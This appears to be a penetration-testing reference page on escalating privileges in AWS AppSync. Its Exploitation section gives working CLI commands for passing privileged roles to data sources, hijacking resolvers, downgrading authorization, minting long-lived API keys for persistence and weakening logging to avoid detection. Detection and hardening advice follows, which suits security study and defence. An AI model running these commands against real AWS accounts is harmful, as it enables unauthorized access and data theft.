---
cstg_id: CSTG-AWS-APPSYNC-PRIVESC
title: "AWS Appsync - Privilege Escalation"
provider: aws
service: appsync
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - appsync:GetGraphqlApi
  - appsync:UpdateGraphqlApi
  - appsync:CreateApiKey
  - appsync:CreateDataSource
  - appsync:UpdateDataSource
  - appsync:CreateResolver
  - appsync:UpdateResolver
  - appsync:CreateFunction
  - appsync:UpdateFunction
  - appsync:StartSchemaCreation
  - appsync:CreateGraphqlApi
  - iam:PassRole
references:
  - https://docs.aws.amazon.com/appsync/latest/devguide/security_iam_service-with-iam.html
  - https://docs.aws.amazon.com/appsync/latest/devguide/security-authz.html
  - https://docs.aws.amazon.com/appsync/latest/APIReference/Welcome.html
  - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
  - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
license: CC BY-SA 4.0
---

## Summary

AWS AppSync is a rich privilege-escalation surface because an AppSync API executes resolver
logic **under an IAM service role** that it `iam:PassRole`s to itself, and because the API's
authorization configuration and data sources can be mutated by anyone with the relevant
`appsync:*` write permissions. The two dominant escalation patterns are:

1. **PassRole + resolver injection.** A principal that can create/update an AppSync data source
   and pass a more-privileged role (`iam:PassRole`) — then attach a resolver that performs
   arbitrary actions through that data source — executes code with the role's permissions. If
   the role is more privileged than the principal, this is privilege escalation. A Lambda or
   HTTP data source makes this fully general (invoke any Lambda, call any HTTP/AWS endpoint via
   the role).

2. **Authorization downgrade / data exposure.** A principal that can update the API's auth
   configuration (`UpdateGraphqlApi`), mint API keys (`CreateApiKey`), or rewrite resolver
   mapping templates can remove authorization checks and expose or modify data they could not
   otherwise reach — including reading every record behind an over-privileged service role.

This page assumes an assumed-breach foothold (valid but limited credentials) and builds on the
control-plane map produced in
[AWS AppSync - Enumeration](../02-services/aws-appsync-enum.md). The unauthenticated data-plane
techniques are covered in
[AWS AppSync - Unauthenticated Access](../01-unauthenticated-external/aws-appsync-unauthenticated.md).

## Prerequisites

- Valid AWS credentials with one or more AppSync write permissions (see per-technique
  subsections) and/or `iam:PassRole`.
- An existing AppSync API (or `appsync:CreateGraphqlApi` to make a new one), and knowledge of a
  passable role ARN with more privilege than the current principal. Identify candidate roles
  from `iam:ListRoles` / enumeration, paying attention to roles whose trust policy allows
  `appsync.amazonaws.com`.

```bash
# Roles assumable by AppSync (PassRole targets) and their permissions
aws iam list-roles --query "Roles[?contains(to_string(AssumeRolePolicyDocument),'appsync')].[RoleName,Arn]" --output text
aws iam list-attached-role-policies --role-name "$TARGET_ROLE"
aws iam list-role-policies --role-name "$TARGET_ROLE"
```

## Exploitation

### iam:PassRole + appsync:CreateDataSource / CreateResolver

The canonical escalation. AppSync data sources carry a `serviceRoleArn`; AppSync assumes that
role at resolve time. By passing a high-privilege role to a new data source and wiring a
resolver to it, the principal gains the role's permissions.

Lambda data source — invoke an arbitrary function (or one whose execution role is privileged):

```bash
aws appsync create-data-source --api-id "$API_ID" --name pe_lambda \
  --type AWS_LAMBDA \
  --service-role-arn arn:aws:iam::111122223333:role/PrivilegedAppSyncRole \
  --lambda-config lambdaFunctionArn=arn:aws:lambda:us-east-1:111122223333:function:target
```

DynamoDB data source — read/modify a table the principal cannot otherwise touch (the service
role provides the access):

```bash
aws appsync create-data-source --api-id "$API_ID" --name pe_ddb \
  --type AMAZON_DYNAMODB \
  --service-role-arn arn:aws:iam::111122223333:role/PrivilegedAppSyncRole \
  --dynamodb-config tableName=SensitiveTable,awsRegion=us-east-1
```

HTTP data source — turn AppSync into a request proxy that runs under the role (SSRF to internal
endpoints, or signed calls to AWS service endpoints if the resolver signs with the role):

```bash
aws appsync create-data-source --api-id "$API_ID" --name pe_http \
  --type HTTP \
  --service-role-arn arn:aws:iam::111122223333:role/PrivilegedAppSyncRole \
  --http-config endpoint=https://dynamodb.us-east-1.amazonaws.com
```

Then attach a resolver (and, if needed, extend the schema so the field exists) and invoke it
from the data plane. For a DynamoDB `Scan` resolver the request template is simply:

```bash
cat > /tmp/req.vtl <<'EOF'
{ "version": "2018-05-29", "operation": "Scan" }
EOF
cat > /tmp/res.vtl <<'EOF'
$util.toJson($context.result.items)
EOF

aws appsync create-resolver --api-id "$API_ID" --type-name Query --field-name peScan \
  --data-source-name pe_ddb \
  --request-mapping-template file:///tmp/req.vtl \
  --response-mapping-template file:///tmp/res.vtl

# Invoke via the data plane (use an API key minted below, or IAM/SigV4)
curl -s -X POST "$ENDPOINT" -H 'Content-Type: application/json' -H "x-api-key: $KEY" \
  -d '{"query":"query{ peScan }"}' | jq .
```

The net effect: actions are performed with `PrivilegedAppSyncRole`'s permissions, regardless of
the calling principal's own IAM policy. This is the AppSync expression of the generic
`iam:PassRole` escalation primitive.

### appsync:UpdateResolver / UpdateFunction (resolver hijack)

If new data sources cannot be created but existing resolvers can be edited, rewrite an existing
resolver's mapping template (or APPSYNC_JS code) to perform a broader operation through its
already-attached, possibly privileged, service role — e.g. change a scoped `GetItem` into a
`Scan`, or alter a Lambda/HTTP payload. This needs no `iam:PassRole` because the data source's
role is already in place.

```bash
aws appsync update-resolver --api-id "$API_ID" --type-name Query --field-name getMyItem \
  --data-source-name existing_ddb \
  --request-mapping-template '{ "version":"2018-05-29", "operation":"Scan" }' \
  --response-mapping-template '$util.toJson($context.result.items)'
```

### appsync:UpdateDataSource (repoint or re-role)

Update an existing data source to point at a more sensitive resource, or — combined with
`iam:PassRole` — swap in a more privileged `serviceRoleArn`, then drive the existing resolvers.

```bash
aws appsync update-data-source --api-id "$API_ID" --name existing_ddb \
  --type AMAZON_DYNAMODB \
  --service-role-arn arn:aws:iam::111122223333:role/PrivilegedAppSyncRole \
  --dynamodb-config tableName=SensitiveTable,awsRegion=us-east-1
```

### appsync:UpdateGraphqlApi (authorization downgrade)

Weaken the API's authorization so that data becomes reachable. For example, add API_KEY as an
additional auth provider or set the Cognito default action to `ALLOW`, converting an
authenticated API into one any key-holder can call:

```bash
aws appsync update-graphql-api --api-id "$API_ID" --name "$API_NAME" \
  --authentication-type API_KEY
# or add additional providers / set userPoolConfig.defaultAction=ALLOW via the update call
```

This also enables turning off WAF association or relaxing logging to reduce detection.

### appsync:CreateApiKey (persistent data-plane access)

Minting an API key grants long-lived (up to 365-day) bearer access to everything reachable
under API_KEY auth — both a privilege-escalation enabler (to invoke the resolvers planted
above) and a persistence mechanism:

```bash
aws appsync create-api-key --api-id "$API_ID" --description "support" \
  --expires $(( $(date +%s) + 60*60*24*365 ))
```

### appsync:StartSchemaCreation / CreateGraphqlApi (greenfield)

With `CreateGraphqlApi` + `StartSchemaCreation` + `iam:PassRole`, build a brand-new API whose
sole purpose is to wrap a privileged role and a sensitive data source, then read/modify the
backend. This avoids touching production APIs and may evade resolver-change alerting on the
original API.

### Lambda authorizer abuse

If the API uses an AWS_LAMBDA authorizer and the principal can modify that Lambda's code (via
Lambda permissions) or its `lambdaAuthorizerConfig`, the authorizer can be made to allow all
requests — a full authentication bypass for the API.

## Detection & Logging

- **CloudTrail** records every escalation action here as a management event:
  `CreateDataSource`, `UpdateDataSource`, `CreateResolver`, `UpdateResolver`, `CreateFunction`,
  `UpdateFunction`, `UpdateGraphqlApi`, `CreateApiKey`, `StartSchemaCreation`,
  `CreateGraphqlApi`, plus the corresponding `iam:PassRole` on the role-using calls. Correlate
  `PassRole` events naming AppSync data-source operations with the role being passed.
- High-signal indicators: a data source created/updated with a `serviceRoleArn` more privileged
  than the actor; resolver templates changed to `Scan`/broad operations; HTTP data sources
  pointing at AWS or internal endpoints; `UpdateGraphqlApi` lowering auth (API_KEY added,
  `defaultAction=ALLOW`); WAF disassociation; new API keys with long expiries.
- Data-plane invocation of the planted resolvers is **not** in CloudTrail; use AppSync
  CloudWatch request logs and WAF logs, and watch for anomalous read volume on the backing
  DynamoDB/RDS/Lambda resources (DynamoDB `Scan` spikes, RDS Data API usage, unusual Lambda
  invocations).

## Remediation & Hardening

- **Constrain `iam:PassRole`.** Limit which roles a principal may pass and add a
  `iam:PassedToService` condition (`appsync.amazonaws.com`); never grant `iam:PassRole` on
  `*`. This breaks the primary escalation chain.
- **Least-privilege AppSync service roles.** Scope each data-source role to the exact table /
  function / database / endpoint and actions required; remove wildcards and any
  `iam:*`/`sts:AssumeRole`.
- **Separate write permissions.** Treat `appsync:CreateDataSource`, `UpdateDataSource`,
  `Create/UpdateResolver`, `Create/UpdateFunction`, `UpdateGraphqlApi`, `CreateApiKey`, and
  `CreateGraphqlApi` as high-privilege; grant only to deployment roles, ideally via CI/CD with
  change review, not to human or application principals.
- **Trust-policy hygiene** on AppSync-assumable roles; restrict `appsync.amazonaws.com` trust
  to specific APIs via `aws:SourceArn` conditions where possible.
- **Prefer `useCallerCredentials: true`** with IAM auth so resolvers run with the caller's
  (constrained) identity rather than a shared powerful role.
- **Detect drift:** alert on any `UpdateGraphqlApi`/resolver/data-source change and on
  `CreateApiKey`; enforce auth configuration (no API_KEY default, `defaultAction=DENY`,
  WAF attached) via guardrails/IaC and Config rules.
- Restrict who can edit Lambda authorizer functions and `lambdaAuthorizerConfig`.

## Tools

- AWS CLI (`aws appsync ...`, `aws iam ...`, `aws sts ...`) and AWS SDKs.
- IAM privilege-escalation path analysers / policy simulators to find passable privileged
  roles and `iam:PassRole` grants.
- HTTP/GraphQL clients to invoke planted resolvers on the data plane.
- CloudTrail/log analysis tooling for validating detection coverage.

## References

- AWS AppSync — How AppSync works with IAM: https://docs.aws.amazon.com/appsync/latest/devguide/security_iam_service-with-iam.html
- AWS AppSync — Authorization and authentication: https://docs.aws.amazon.com/appsync/latest/devguide/security-authz.html
- AWS AppSync API Reference: https://docs.aws.amazon.com/appsync/latest/APIReference/Welcome.html
- AWS IAM — Granting a user permissions to pass a role (PassRole): https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
- Hacking the Cloud — IAM privilege escalation: https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
